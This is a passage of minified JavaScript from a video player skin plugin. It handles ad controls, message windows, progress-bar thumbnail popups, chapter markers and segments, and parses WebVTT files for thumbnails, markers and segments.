ldNativeElement(),this.adView.counter.visible=!0,this.adView.counter.set_text(b+"/"+c),this.adView.counter.buildNativeElement())},addClickEvents:function(){this.clickElement.addEventListener("click",U(this,this.onClickAd)),null!=this.adView.play&&this.adView.play.addEventListener("click",U(this,this.onClickAd)),null!=this.adView.mute&&this.adView.mute.addEventListener("click",U(this,this.onClickMute)),null!=this.adView.close&&this.adView.close.addEventListener("click",U(this,this.onClickClose))},removeClickEvents:function(){this.clickElement.hasEventListener("click")&&this.clickElement.removeEventListener("click",U(this,this.onClickAd)),null!=this.adView.play&&this.adView.play.hasEventListener("click")&&this.adView.play.removeEventListener("click",U(this,this.onClickAd)),null!=this.adView.mute&&this.adView.mute.hasEventListener("click")&&this.adView.mute.removeEventListener("click",U(this,this.onClickMute)),null!=this.adView.close&&this.adView.close.hasEventListener("click")&&this.adView.close.removeEventListener("click",U(this,this.onClickClose))},onClickMute:function(b){null!=this.adView.mute&&(this.adView.mute.currentStateName[1]=this.isMuted?"unmute":"mute",this.adView.mute.setStateName(this.adView.mute.currentStateName)),new W(this.isMuted?"skinUnmute":"skinMute").dispatch(this.context),this.isMuted=!this.isMuted},onClickAd:function(b){var c=0;null!=this.adOnClickUrlShowTime&&(c=(new Date).getTime()-this.adOnClickUrlShowTime.getTime()),500>=c||(this.isPaused&&!this.adWasClicked?b.stopPropagation():this.adWasClicked?(b.stopPropagation(),this.clickElement.set_onClickUrl(null),this.adView.root.forceRedraw()):this.adWasClicked=!0,(b=new Q("adAdClick")).data={url:this.clickElement.onClickUrl},b.dispatch(this.context))},onClickClose:function(b){b.stopPropagation(),null!=this.adView.close&&this.adView.close.visible&&new Q("adSkipClick").dispatch(this.context)},onTimeChange:function(b){this.updateTime(b.data.duration-b.data.currentTime)},onAdStart:function(b){this.buildRoot(),this.hideClose(),b=b.data,this.clickElement.set_onClickUrl(b.mediaClickTargetUrl),null!=b.durationTotal&&null!=b.durationPlayed?this.updateTime(b.durationTotal-b.durationPlayed):this.updateTime(null),this.updateCounter(b.currentOrderNumber,b.totalNumber),this.adView.root.forceRedraw(),this.adWasClicked=!1,this.adOnClickUrlShowTime=new Date},onAdInStreamStart:function(b){this.buildRoot(),b=b.data,this.clickElement.set_onClickUrl(b.mediaClickTargetUrl),null!=b.durationTotal&&null!=b.durationPlayed&&b.showTimeProgress?this.updateTime(b.durationTotal-b.durationPlayed):this.updateTime(null),null!=b.currentOrderNumber&&null!=b.totalNumber&&b.showAdPositionInBreak?this.updateCounter(b.currentOrderNumber,b.totalNumber):this.updateCounter(0,0),this.adView.root.forceRedraw(),this.adWasClicked=!1,this.adOnClickUrlShowTime=new Date},__class__:Nd});var Fd=function(){zb.call(this)};wa["bs.player.plugin.skin.controller.element.window.MessageWindowController"]=Fd,Fd.__name__="bs.player.plugin.skin.controller.element.window.MessageWindowController",Fd.__super__=zb,Fd.prototype=Ja(zb.prototype,{messageView:null,init:function(){zb.prototype.init.call(this),null!=this.view&&(this.messageView=this.view,this.hide(),ma.add(this.context,ma.SHOW_MESSAGE,U(this,this.onWindowOpen)),ma.add(this.context,ma.CLOSE_MESSAGE,U(this,this.onWindowClose)))},destroy:function(){ma.remove(this.context,ma.SHOW_MESSAGE,U(this,this.onWindowOpen)),ma.remove(this.context,ma.CLOSE_MESSAGE,U(this,this.onWindowClose)),zb.prototype.destroy.call(this)},onWindowOpen:function(b){if(null!=b.data){if(this.show(),null!=this.messageView.title&&(null!=b.data.title&&""!=b.data.title?(this.messageView.title.set_text(b.data.title),this.messageView.title.visible=!0,this.messageView.title.buildNativeElement(),null!=this.messageView.titleBar&&(this.messageView.titleBar.visible=!0,this.messageView.titleBar.buildNativeElement())):(this.messageView.title.visible=!1,this.messageView.title.destroyNativeElement(),null!=this.messageView.titleBar&&(this.messageView.titleBar.visible=!1,this.messageView.titleBar.destroyNativeElement()))),null!=this.messageView.text&&null!=b.data.text&&""!=b.data.text&&this.messageView.text.set_text(b.data.text),null!=this.messageView.textDetails&&null!=b.data.textDetails&&""!=b.data.textDetails&&this.messageView.textDetails.set_text(b.data.textDetails),null!=this.messageView.userSingleActionButton&&null!=this.messageView.userSingleActionButtonText&&(null!=b.data.userSingleActionButtonText&&""!=b.data.userSingleActionButtonText&&null!=b.data.onUserSingleAction?(this.messageView.userSingleActionButtonText.set_text(b.data.userSingleActionButtonText),this.messageView.userSingleActionButtonText.visible=!0,this.messageView.userSingleActionButton.removeAllEventListeners(),this.messageView.userSingleActionButton.visible=!0,this.messageView.userSingleActionButton.addEventListener("click",(function(d){b.data.onUserSingleAction()}))):(this.messageView.userSingleActionButton.visible=!1,this.messageView.userSingleActionButton.destroyNativeElement(),this.messageView.userSingleActionButtonText.visible=!1,this.messageView.userSingleActionButtonText.destroyNativeElement())),null!=b.data.close&&0==b.data.close?this.hideCloseButton():null!=b.data.onAfterClose&&m.isFunction(b.data.onAfterClose)&&this.messageView.close.addEventListener("click",(function(d){b.data.onAfterClose()})),Object.prototype.hasOwnProperty.call(b.data,"windowSize")){var c=m.field(b.data,"windowSize");Object.prototype.hasOwnProperty.call(c,"width")?this.messageView.window.set_width(m.field(c,"width")):Object.prototype.hasOwnProperty.call(c,"percentWidth")&&this.messageView.window.set_percentWidth(m.field(c,"percentWidth")),Object.prototype.hasOwnProperty.call(c,"height")?this.messageView.window.set_height(m.field(c,"height")):Object.prototype.hasOwnProperty.call(c,"percentHeight")&&this.messageView.window.set_percentHeight(m.field(c,"percentHeight"))}null!=b.data.onAfterShow&&m.isFunction(b.data.onAfterShow)&&b.data.onAfterShow(),this.setupStyles(b.data.type),null!=this.messageView.text&&null!=this.messageView.text.parent&&this.messageView.text.parent.update()}},onWindowClose:function(b){this.hide()},onClickClose:function(b){this.hide()},hide:function(){this.hideCloseButton(),null!=this.messageView.root&&this.messageView.root.visible&&(this.messageView.root.visible=!1,this.messageView.root.destroyNativeElement())},show:function(){null!=this.messageView.root&&(this.messageView.root.visible=!0,this.messageView.root.buildNativeElement(!0)),this.showCloseButton()},showCloseButton:function(){null!=this.messageView.close&&(this.messageView.close.addEventListener("click",U(this,this.onClickClose)),this.messageView.close.visible=!0,this.messageView.close.buildNativeElement())},hideCloseButton:function(){null!=this.messageView.close&&(this.messageView.close.removeEventListener("click",U(this,this.onClickClose)),this.messageView.close.visible=!1,this.messageView.close.destroyNativeElement())},setupStyles:function(b){this.messageView.root.setStateName([b]),this.messageView.window.setStateName([b]),this.messageView.close.setStateName([b]),this.messageView.title.setStateName([b]),this.messageView.titleBar.setStateName([b]),this.messageView.text.setStateName([b])},__class__:Fd});var Xc=function(b){this.PROGRESS_ROUND_PRECISION=8,this.view=b};wa["bs.player.plugin.skin.controller.service.progress.core.ProgressService"]=Xc,Xc.__name__="bs.player.plugin.skin.controller.service.progress.core.ProgressService",Xc.prototype={PROGRESS_ROUND_PRECISION:null,view:null,config:null,parseConfig:function(b,c){null!=(b=m.field(b,"progress"))&&Object.prototype.hasOwnProperty.call(b,c)?this.config=m.field(b,c):this.config=null},fetchError:function(b){console.error("Cannot load external file. "+b)},__class__:Xc};var de=function(b,c){Xc.call(this,c),this.view.visible=!1,null!=this.view.popup&&(this.view.popup.visible=!1),this.context=b,this.updateStartPosition()};wa["bs.player.plugin.skin.controller.service.progress.ProgressPopupService"]=de,de.__name__="bs.player.plugin.skin.controller.service.progress.ProgressPopupService",de.__super__=Xc,de.prototype=Ja(Xc.prototype,{context:null,sizeOffset:null,moveOffset:null,bottomOffset:null,tipX:null,tipY:null,startXPosition:null,thumbnails:null,activeThumbnailSource:null,lastPosition:null,canUpdate:function(b){var c=null!=this.activeThumbnailSource?this.activeThumbnailSource.imageId:-1;return null!=this.lastPosition&&b==c},build:function(b){this.show(),this.view.popupBackgroundTip.visible=b,this.view.popup.buildNativeElement(b),this.sizeOffset=new Vb(Math.abs(this.view.popupBackground.get_left())+Math.abs(this.view.popupBackground.get_right()),Math.abs(this.view.popupBackground.get_top())+Math.abs(this.view.popupBackground.get_bottom())),this.moveOffset=new Vb(Math.abs(this.view.popupBackground.get_left()),Math.abs(this.view.popupBackground.get_right())),this.tipX=.5*this.view.popupBackgroundTip.get_width()|0,this.tipY=.5*this.view.popupBackgroundTip.get_height()|0},init:function(){this.hide(),this.view.popup.buildNativeElement(!1)},parseMedia:function(b){if(this.parseConfig(b,"thumbnails"),null!=this.config)if(null==(b=this.config.url))this.fetchError("Missing url configuration. "+p.string(this.config));else if(0>b.lastIndexOf("vtt"))this.fetchError("Not .vtt file format. "+b+".");else{if(null==this.config.imageBaseUrl){var c=b.split("/");c.pop(),this.config.imageBaseUrl=c.join("/")}(b=new L(b)).onError=U(this,this.fetchError),b.onData=U(this,this.parseVtt),b.request()}},show:function(){this.view.popup.visible=!0,this.view.popup.alpha=1},hide:function(){this.view.popup.visible=!1,this.view.popup.alpha=0},destroy:function(){this.hide(),this.view.popup.destroyNativeElement()},drawExtraLabel:function(b){var c=this.view.popupExtraLabel;c.text!=b&&c.set_text(b),c.visible=null!=c.text},drawThumbnail:function(b,c){null==c&&(c=!1);var d=this,q=this.findThumbnailEntryByTime(b);if(b=null!=q&&null!=q.source?q.source.id:null,null==this.activeThumbnailSource||this.activeThumbnailSource.id!=b||c){var X=null!=q&&null!=q.source?q.source.imageId:null;if(null==X)for(c=0,b=this.view.popupThumbnails.items;c<b.length;){X=b[c],++c;var ra=X;ra.deselect()}else{for(c=0,b=this.view.popupThumbnails.items.length;c<b;){ra=c++;var Aa=(ra=this.view.popupThumbnails.items[ra]).thumbData;if(Aa.imageId==X)if(Aa.x=q.source.x,Aa.y=q.source.y,null==q.source.w||null==q.source.h){ra.deselect();var Qa=[new ma(ma.THUMB_LOADED)];Qa[0].data=Aa.imageId,ra.determineSize(function(Wa){return function(Cb){d.activeThumbnailSource.w=Cb.w,d.activeThumbnailSource.h=Cb.h,Aa.w=q.source.w=Cb.w,Aa.h=q.source.h=Cb.h,Wa[0].dispatch(d.context)}}(Qa))}else ra.select();else ra.deselect()}this.activeThumbnailSource=null!=q?q.source:null}}},updateStartPosition:function(){var b=this.view.root,c=this.view.controlbarContainer,d=this.view.controlbarBox,q=d.get_left(),X=c.get_left(),ra=b.get_left();this.startXPosition=q+X+ra|0,d=d.get_bottom()+d.get_height(),c=-c.get_bottom(),b=b.get_top(),q=this.view.indicator.get_top(),X=.25*this.view.popupBackgroundTip.get_height(),ra=.5*this.view.indicator.get_height(),null==this.bottomOffset&&(this.bottomOffset=this.view.popup.get_bottom()),b=d-(c+b+q)+X+ra-this.bottomOffset|0,this.view.popup.get_bottom()!=b&&this.view.popup.set_bottom(b)},updateLastPosition:function(b){this.lastPosition=b},getLastPosition:function(){return this.lastPosition},updateSizeAndPosition:function(b,c){if(null!=this.sizeOffset){var d="";c&&null!=this.view.popupExtraLabel.text?d=this.view.popupExtraLabel.text:null!=this.view.popupLabel.text&&(d=this.view.popupLabel.text);var q=this.view.popupExtraLabel.getStyleForStateName();d=Math.ceil(Yb.getTextWidth(d,"normal normal bold "+q.fontSize+"px "+q.fontFamily)),q=0,null!=this.activeThumbnailSource&&(q=0|this.activeThumbnailSource.w);var X=0;null!=this.activeThumbnailSource&&(X=0|this.activeThumbnailSource.h),d=Math.min(Math.max(Math.max(d+this.sizeOffset.x,q),this.view.popup.get_minWidth()),this.view.popup.get_maxWidth())-this.sizeOffset.x|0,q=this.updateThumbsSizeAndPosition(d+this.sizeOffset.x|0,q,X),this.updateLabelsSizeAndPosition(d,0|q.y,c),c=this.view.popupLabel.get_top()+this.view.popupLabel.calculateTextHeight(),c=0|Math.min(Math.max(c,this.view.popup.get_minHeight()),this.view.popup.get_maxHeight()),this.updateBgSize(d,c),q=.5*d,b=this.startXPosition+b.x-q|0,this.updateViewSizeAndPosition(b,d,c),this.updateTipPosition(b,d,q,c)}},updateBgSize:function(b,c){b=b+this.sizeOffset.x|0,this.view.popupBackground.get_width()!=b&&this.view.popupBackground.set_width(b),c=c+this.sizeOffset.y|0,this.view.popupBackground.get_height()!=c&&this.view.popupBackground.set_height(c)},updateThumbsSizeAndPosition:function(b,c,d){for(var X,ra,q=new Vb(c,d),Aa=null!=this.activeThumbnailSource?this.activeThumbnailSource.imageId:null,Qa=0,Wa=this.view.popupThumbnails.items;Qa<Wa.length;)if(X=Wa[Qa],++Qa,(ra=X.thumbData).imageId==Aa){c=0|Math.ceil(d/c*ra.renderWidth),d=!1,ra.renderWidth!=b&&(ra.renderWidth=b,d=!0),ra.renderHeight!=c&&(ra.renderHeight=c,d=!0),d&&X.updateSize(),q.x=0|b,q.y=0|c;break}return q},updateLabelsSizeAndPosition:function(b,c,d){var q=this.view.popupLabel,X=this.view.popupExtraLabel;q.get_width()!=b&&q.set_width(b),X.get_width()!=b&&X.set_width(b),d?(X.set_top(c),q.set_top(c+X.calculateTextHeight()|0)):q.set_top(c)},updateTipPosition:function(b,c,d,q){this.view.popupBackgroundTip.get_bottom()!=-this.tipY&&this.view.popupBackgroundTip.set_bottom(-this.tipY),c=this.view.popup.get_left(),b=d-this.tipX+(b-c)|0,this.view.popupBackgroundTip.get_left()!=b&&this.view.popupBackgroundTip.set_left(b)},updateViewSizeAndPosition:function(b,c,d){this.view.popup.get_width()!=c&&this.view.popup.set_width(c),this.view.popup.get_height()!=d&&this.view.popup.set_height(d),b<(d=0|this.moveOffset.x)?b=d:b>(c=this.view.stage.calculateWidth()+this.moveOffset.y-(c+this.sizeOffset.x)|0)&&(b=c),this.view.popup.get_left()!=b&&this.view.popup.set_left(b)},parseVtt:function(b){b=new ne(this.config.imageBaseUrl).parse(b),this.thumbnails=b.entries,this.view.popupThumbnails.set_data(b.images)},findThumbnailEntryByTime:function(b){if(null==this.thumbnails)return null;for(var c=0,d=this.thumbnails;c<d.length;){var q=d[c];if(++c,b>=q.showTime&&b<=q.hideTime)return q}return null},__class__:de});var od=function(b){Xc.call(this,b)};wa["bs.player.plugin.skin.controller.service.progress.core.ProgressTrackService"]=od,od.__name__="bs.player.plugin.skin.controller.service.progress.core.ProgressTrackService",od.__super__=Xc,od.prototype=Ja(Xc.prototype,{duration:null,durationRounded:null,progress:null,progressRounded:null,lastWidth:null,parseDuration:function(b,c){return null==c&&(c=1),this.isValidNumber(b)||0>=b?this.isValidNumber(this.duration)||0>=this.duration?c:this.duration:b},parseProgress:function(b,c){return null==c&&(c=0),this.isValidNumber(b)||0>b?this.isValidNumber(this.progress)||0>this.progress?c:this.progress:b},round:function(b,c){return null==c&&(c=2),b*=Math.pow(10,c),Math.round(b)/Math.pow(10,c)},isValidNumber:function(b){return null==b||!isFinite(b)||isNaN(b)},__class__:od});var fe=function(b){this.markers=[],Xc.call(this,b)};wa["bs.player.plugin.skin.controller.service.progress.ProgressTrackMarkerService"]=fe,fe.__name__="bs.player.plugin.skin.controller.service.progress.ProgressTrackMarkerService",fe.__super__=od,fe.prototype=Ja(od.prototype,{markers:null,parseMedia:function(b,c,d){null==d&&(d=!1),this.view.markerList.destroyNativeElement(),this.view.markerList.set_data(null),this.parseConfig(b,"markersUrl"),null!=this.config?this.fetch(c,d):(this.parseConfig(b,"markers"),null!=this.config&&this.draw(c,d))},resize:function(b,c){c=this.parseDuration(c);var d=this.view.track.calculateWidth();this.duration==c&&this.lastWidth==d||this.parseMedia(b,c,!0)},update:function(b,c){b=this.parseProgress(b,c),this.noMarkers()||this.progress==b||(c=this.round(b,this.PROGRESS_ROUND_PRECISION),this.progressRounded!=c&&(this.updateMarkersState(b),this.progress=b,this.progressRounded=c))},deselectAll:function(){if(!this.noMarkers())for(var b=0,c=this.view.markerList.items;b<c.length;){var d=c[b];++b,fb.__cast(d,Yc).deselect()}},selectByPosition:function(b){if(this.noMarkers()||this.isHidden())return!1;for(var c=!1,d=0,q=this.view.markerList.items;d<q.length;){var X=q[d];++d;var ra=fb.__cast(X,Yc);this.isInside(X,b)?(c=!0,ra.select()):ra.deselect()}return c},getPopupExtraLabel:function(b){if(this.noMarkers()||this.isHidden())return null;for(var c=null,d=0,q=this.view.markerList.items;d<q.length;){var X=q[d];if(++d,null!=fb.__cast(X.data,Yd).label&&this.isInside(X,b)){c=fb.__cast(X.data,Yd).label;break}}return c},fetch:function(b,c){var d=this,q=fb.__cast(this.config,String);null==q?this.fetchError("Missing url configuration. "+p.string(this.config)):0>q.lastIndexOf("vtt")?this.fetchError("Not .vtt file format. "+q+"."):((q=new L(q)).onError=U(this,this.fetchError),q.onData=function(X){d.config=d.parseVtt(X),d.draw(b,c)},q.request())},draw:function(b,c){if(null==c&&(c=!1),null!=this.view.markerList&&!this.isHidden()){b=this.parseDuration(b);var d=this.round(b);if(c||this.durationRounded!=d){if(this.markers=[],null!=this.config&&0<this.config.length){c=this.view.track.calculateWidth();for(var q=new Ae,X=0,ra=this.config.length;X<ra;){var Aa=X++;if(null==(Aa=this.config[Aa]))break;if(Object.prototype.hasOwnProperty.call(Aa,"time")&&null!=Aa.time){var Qa=parseFloat(Aa.time);if(!(null==Qa||0>=Qa||Qa>=b)){var Wa=0|Qa,Cb=(Qa/=b)*c;q.h.hasOwnProperty(Wa)||(Aa=new Yd(Cb,Qa,Aa.label),q.h[Wa]=Aa)}}}for(Aa=q.iterator();Aa.hasNext();)q=Aa.next(),this.markers.push(q);this.lastWidth=c}this.view.markerList.set_data(this.markers),this.view.markerList.buildNativeElement(!0),this.updateMarkersState(this.progress),this.duration=b,this.durationRounded=d}}},isInside:function(b,c){return c.x>b.get_left()&&c.x<b.get_left()+b.get_width()},noMarkers:function(){return 1>this.markers.length},isHidden:function(){return!this.view.controlbarBox.visible||!this.view.markerList.visible},updateMarkersState:function(b){for(var c=0,d=this.view.markerList.items.length;c<d;){var q=c++,X=fb.__cast(this.view.markerList.items[q],Yc);b>this.markers[q].progress?X.activeState():X.normalState()}},parseVtt:function(b){b=(new Gd).parse(b);for(var c,d=[],q=0;q<b.length;){var X=b[q];++q,c={time:c=X.showTime,label:X.text},d.push(c)}return d},__class__:fe});var ee=function(b){this.segments=[],Xc.call(this,b)};wa["bs.player.plugin.skin.controller.service.progress.ProgressTrackSegmentService"]=ee,ee.__name__="bs.player.plugin.skin.controller.service.progress.ProgressTrackSegmentService",ee.__super__=od,ee.prototype=Ja(od.prototype,{time:null,timeRounded:null,segments:null,selectedSegmentProgressPercent:null,parseMedia:function(b,c,d,q){null==q&&(q=!1),this.parseConfig(b,"segmentsUrl"),null!=this.config?this.fetch(c,d,q):(this.parseConfig(b,"segments"),this.draw(c,d,q))},resize:function(b,c,d){if(d=this.parseDuration(d),this.duration!=d)this.parseMedia(b,c,d,!0);else if(null!=this.view&&null!=this.view.track&&null!=this.view.segmentList&&!this.isHidden()&&(b=this.view.track.calculateWidth(),this.lastWidth!=b)){c=!1,d=0;for(var q=this.view.segmentList.items.length;d<q;){var X=d++,ra=X==this.view.segmentList.items.length-1,Aa=this.segments[X],Qa=Aa.progressPercent*b;0>=Qa||(Aa.width=Qa,Aa.isLast=ra,fb.__cast(this.view.segmentList.items[X],Kc).set_data(Aa),c=!0)}c&&this.view.segmentList.redrawItems(),this.lastWidth=b}},update:function(b,c){if(!this.isHidden()&&(b=this.parseProgress(b,c),!this.noSegments()&&this.progress!=b&&(c=this.round(b,this.PROGRESS_ROUND_PRECISION),this.progressRounded!=c))){for(var d=!1,q=0,X=this.view.segmentList.items.length;q<X;){var ra=q++,Aa=this.segments[ra];Aa.progress!=b&&(Aa.progress=b,fb.__cast(this.view.segmentList.items[ra],Kc).set_data(Aa),d=!0)}this.progress=b,this.progressRounded=c,d&&this.view.segmentList.redrawItems()}},deselectAll:function(){if(!this.noSegments()){this.selectedSegmentProgressPercent=null;for(var b=0,c=this.view.segmentList.items;b<c.length;){var d=c[b];++b,fb.__cast(d,Kc).deselect()}}},selectByPosition:function(b){if(this.noSegments()||this.isHidden())return!1;for(var c=!1,d=0,q=this.view.segmentList.items;d<q.length;){var X=q[d];++d;var ra=fb.__cast(X,Kc);this.isInside(X,b)?(c=!0,this.selectedSegmentProgressPercent=ra.data.progressPercent,ra.select()):ra.deselect()}return c},getPopupExtraLabel:function(b){if(this.noSegments()||this.isHidden())return null;for(var c=null,d=0,q=this.view.segmentList.items;d<q.length;){var X=q[d];if(++d,null!=fb.__cast(X.data,gd).label&&this.isInside(X,b)){c=fb.__cast(X.data,gd).label;break}}return c},fetch:function(b,c,d){var q=this,X=fb.__cast(this.config,String);null==X?this.fetchError("Missing url configuration. "+p.string(this.config)):0>X.lastIndexOf("vtt")?this.fetchError("Not .vtt file format. "+X+"."):((X=new L(X)).onError=U(this,this.fetchError),X.onData=function(ra){q.config=q.parseVtt(ra),q.draw(b,c,d)},X.request())},draw:function(b,c,d){if(!this.isHidden()){b=this.parseTime(b);var q=this.round(b);if(d||this.timeRounded!=q){c=this.parseDuration(c);var X=this.round(c);if(d||this.durationRounded!=X){var ra=b/c;if(!isNaN(ra)){var Aa=this.round(ra,this.PROGRESS_ROUND_PRECISION);if(d||this.progressRounded!=Aa){d=this.view.track.calculateWidth();var Qa=0,Wa=!1;if(this.segments=[],null!=this.config&&0<this.config.length)for(var Cb=0,Ub=this.config.length;Cb<Ub;){var Mb=Cb++;if(null==(Mb=this.config[Mb]))break;if(Object.prototype.hasOwnProperty.call(Mb,"duration")&&null!=Mb.duration){var Bc=parseFloat(Mb.duration);if(!(null==Bc||0>=Bc)){Bc>=c&&(Bc=c,Wa=!0);var Kd=Math.min(Bc/c,1-Qa),Nb=Kd*d;if(!(0>=Nb)&&(Qa+=Kd,this.segments.push(new gd(Kd,Qa-Kd,Qa,ra,Nb,!1,Mb.label,Bc)),Wa))break}}}for(0<(Cb=1-Qa)&&(Cb=new gd(Cb,(Qa+=Cb)-Cb,Qa,ra,Cb*d,!0),this.segments.push(Cb)),Cb=0,Ub=this.segments.length;Cb<Ub;)Mb=Cb++,this.segments[Mb].isLast=Mb==this.segments.length-1;if(this.view.segmentList.set_data(this.segments),this.view.segmentList.buildNativeElement(!0),null!=this.selectedSegmentProgressPercent)for(Cb=0,Ub=this.view.segmentList.items;Cb<Ub.length;)if(Qa=Ub[Cb],++Cb,(Qa=fb.__cast(Qa,Kc)).data.progressPercent==this.selectedSegmentProgressPercent){Qa.select();break}this.time=b,this.timeRounded=q,this.duration=c,this.durationRounded=X,this.progress=ra,this.progressRounded=Aa,this.lastWidth=d}}}}}},isInside:function(b,c){return c.x>b.get_left()&&c.x<b.get_left()+b.get_width()},noSegments:function(){return 1>this.segments.length},isHidden:function(){return!this.view.controlbarBox.visible||!this.view.segmentList.visible},parseTime:function(b,c){return null==c&&(c=0),this.isValidNumber(b)||0>b?this.isValidNumber(this.time)||0>this.time?c:this.time:b},parseVtt:function(b){b=(new Pd).parse(b);for(var q,X,c=[],d=0,ra=0;ra<b.length;){var Aa=b[ra];++ra,(q=Aa.showTime)>d&&(X={duration:d=q-d|0},c.push(X)),X={duration:d=0|Aa.duration,label:Aa.text},c.push(X),d=q+d}return c},__class__:ee});var Od=function(){this.showTime=0};wa["bs.player.plugin.skin.controller.service.progress.parse.VttMarkersParserEntry"]=Od,Od.__name__="bs.player.plugin.skin.controller.service.progress.parse.VttMarkersParserEntry",Od.prototype={id:null,showTime:null,text:null,__class__:Od};var Gd=function(){hc.call(this),this.lineNumber=0,this.lines=null};wa["bs.player.plugin.skin.controller.service.progress.parse.VttMarkersParser"]=Gd,Gd.__name__="bs.player.plugin.skin.controller.service.progress.parse.VttMarkersParser",Gd.__super__=hc,Gd.prototype=Ja(hc.prototype,{parse:function(b){for(this.lines=this.END_LINE_REGEX.split(b),this.lineNumber=0,this.skipEmptyLines(),this.parseHeader(this.readLine()),this.skipEmptyLines(),b=[];!this.isFileEnd();)b.push(this.parseEntry()),this.skipEmptyLines();return b},parseEntry:function(){var b=new Od,c=this.readLine();if(this.isEmptyStr(c))throw yb.thrown(new xc("Error in line: "+this.lineNumber+". Cannot parse entry."));if(-1==(c=c.replace(this.WHITESPACE_REGEX.r," ")).indexOf(this.TIMESTAMP_SEPARATOR)&&(b.id=c,c=this.readLine()),2!=(c=c.split(this.TIMESTAMP_SEPARATOR)).length)throw yb.thrown(new xc("Error in line: "+this.lineNumber+". Cannot parse time for entry."));return b.showTime=this.parseTimestamp(c[0]),c=this.readLine(),b.text=this.parseText(c),b},parseText:function(b){if(this.isEmptyStr(b))throw yb.thrown(new xc("Error in line: "+this.lineNumber+". Cannot parse source for entry."));return b},__class__:Gd});var ge=function(){this.duration=this.showTime=0};wa["bs.player.plugin.skin.controller.service.progress.parse.VttSegmentsParserEntry"]=ge,ge.__name__="bs.player.plugin.skin.controller.service.progress.parse.VttSegmentsParserEntry",ge.prototype={id:null,showTime:null,duration:null,text:null,__class__:ge};var Pd=function(){hc.call(this),this.lineNumber=0,this.lines=null};wa["bs.player.plugin.skin.controller.service.progress.parse.VttSegmentsParser"]=Pd,Pd.__name__="bs.player.plugin.skin.controller.service.progress.parse.VttSegmentsParser",Pd.__super__=hc,Pd.prototype=Ja(hc.prototype,{parse:function(b){for(this.lines=this.END_LINE_REGEX.split(b),this.lineNumber=0,this.skipEmptyLines(),this.parseHeader(this.readLine()),this.skipEmptyLines(),b=[];!this.isFileEnd();)b.push(this.parseEntry()),this.skipEmptyLines();return b},parseEntry:function(){var b=new ge,c=this.readLine();if(this.isEmptyStr(c))throw yb.thrown(new xc("Error in line: "+this.lineNumber+". Cannot parse entry."));if(-1==(c=c.replace(this.WHITESPACE_REGEX.r," ")).indexOf(this.TIMESTAMP_SEPARATOR)&&(b.id=c,c=this.readLine()),2!=(c=c.split(this.TIMESTAMP_SEPARATOR)).length)throw yb.thrown(new xc("Error in line: "+this.lineNumber+". Cannot parse time for entry."));return b.showTime=this.parseTimestamp(c[0]),c=this.parseTimestamp(c[1]),b.duration=c-b.showTime,c=this.readLine(),b.text=this.parseText(c),b},parseText:function(b){if(this.isEmptyStr(b))throw yb.thrown(new xc("Error in line: "+this.lineNumber+". Cannot parse source for entry."));return b},__class__:Pd});var ue=function(){this.entries=[],this.images=[]};wa["bs.player.plugin.skin.controller.service.progress.parse.VttThumbnailsParserOutput"]=ue,ue.__name__="bs.player.plugin.skin.controller.service.progress.parse.VttThumbnailsParserOutput",ue.prototype={entries:null,images:null,__class__:ue};var ne=function(b){this.baseUrl="",this.sourceCounter=0,hc.call(this),this.baseUrl=b,this.lineNumber=this.sourceCounter=0,this.lines=null};wa["bs.player.plugin.skin.controller.service.progress.parse.VttThumbnailsParser"]=ne,ne.__name__="bs.player.plugin.skin.controller.service.progress.parse.VttThumbnailsParser",ne.__super__=hc,ne.prototype=Ja(hc.prototype,{sourceCounter:null,baseUrl:null,parse:function(b){for(this.sourceCounter=0,this.lines=this.END_LINE_REGEX.split(b),this.lineNumber=0,this.skipEmptyLines(),this.parseHeader(this.readLine()),this.skipEmptyLines(),b=new ue;!this.isFileEnd();)b.entries.push(this.parseEntry()),this.skipEmptyLines();for(var c=[],d=[],q=0,X=0,ra=b.entries;X<ra.length;){var Aa=ra[X];if(++X,0>c.indexOf(Aa.source.url)){c.push(Aa.source.url);var Qa=new oe(++q,Aa.source.url,Aa.source.w,Aa.source.h);d.push(Qa)}Aa.source.imageId=q}return b.images=d,b},parseEntry:function(){var b=new ve,c=this.readLine();if(this.isEmptyStr(c))throw yb.thrown(new xc("Error in line: "+this.lineNumber+". Cannot parse entry."));if(-1==(c=c.replace(this.WHITESPACE_REGEX.r," ")).indexOf(this.TIMESTAMP_SEPARATOR)&&(b.id=c,c=this.readLine()),2!=(c=c.split(this.TIMESTAMP_SEPARATOR)).length)throw yb.thrown(new xc("Error in line: "+this.lineNumber+". Cannot parse time for entry. (2)"));return b.showTime=this.parseTimestamp(c[0]),b.hideTime=this.parseTimestamp(c[1]),c=this.readLine(),b.source=this.parseSource(c),b},parseSource:function(b){if(this.isEmptyStr(b))throw yb.thrown(new xc("Error in line: "+this.lineNumber+". Cannot parse source for entry (1)"));var c=new u("#","i").split(b);if((b=new $d).id=this.sourceCounter++,b.url=this.baseUrl+"/"+c[0],2>c.length||null==c[1])return b;var d=new u("=","i").split(c[1]);if(2>d.length||null==d[0]||null==d[1])return b;if(c=d[0],1>(d=d[1].split(",")).length)return b;var q=c.indexOf("x");return b.x=0>q||d.length<q||null==d[q]?0:p.parseInt(d[q]),q=c.indexOf("y"),b.y=0>q||d.length<q||null==d[q]?0:p.parseInt(d[q]),q=c.indexOf("w"),b.w=0>q||d.length<q||null==d[q]?0:p.parseInt(d[q]),c=c.indexOf("h"),b.h=0>c||d.length<c||null==d[c]?0:p.parseInt(d[c]),b},__class__:ne});var gd=function(b,c,d,q,X,ra,Aa,Qa){null==ra&&(ra=!1),this.progressPercent=b,this.progressLeft=c,this.progressRight=d,this.progress=q,this.width=X,this.isLast=ra,this.label=Aa,this.duration=Qa};wa["bs.player.plugin.skin.model.ProgressSegmentData"]=gd,gd.__name__="bs.player.plugin.skin.model.ProgressSegmentData",gd.prototype={progressPercent:null,progressLeft:null,progressRight:null,progress:null,width:null,label:null,duration:null,isLast:null,__class__:gd};var Yd=function(b,c,d){this.left=b,this.progress=c,this.label=d};wa["bs.player.plugin.skin.model.ProgressMarkerData"]=Yd,Yd.__name__="bs.player.plugin.skin.model.ProgressMarkerData",Yd.prototype={left:null,progress:null,label:null,__class__:Yd};var ve=function(){this.hideTime=this.showTime=0};wa["bs.player.plugin.skin.model.ProgressThumbnailEntry"]=ve,ve.__name__="bs.player.plugin.skin.model.ProgressThumbnailEntry",ve.prototype={id:null,showTime:null,hideTime:null,source:null,__class__:ve};var Zd=function(){};wa["bs.player.plugin.skin.model.ProgressThumbnailSize"]=Zd,Zd.__name__="bs.player.plugin.skin.model.ProgressThumbnailSize",Zd.prototype={w:null,h:null,__class__:Zd};var 